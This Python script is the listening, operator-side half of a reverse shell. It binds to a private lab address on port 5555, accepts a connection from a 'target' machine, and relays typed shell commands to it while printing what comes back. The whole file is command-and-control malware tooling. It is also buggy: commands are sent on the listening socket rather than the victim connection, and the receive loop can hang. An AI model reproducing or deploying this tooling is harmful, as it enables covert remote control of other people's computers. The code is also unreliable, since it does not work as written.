import json
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



def Send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def Recieve(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def target_communication(ip, target):
    while True:
        command = input('*Shell~%s:' % str(ip))
        Send(command)
        if command == "quit":
            break
        result = Recieve(target)
        print(result)



def main():
    s.bind(("10.0.2.15", 5555))
    print("Listening for incoming connections")
    s.listen(5)
    target, ip = s.accept()
    print("[+] Target connected from: ", str(ip))


    target_communication(ip, target)

main()
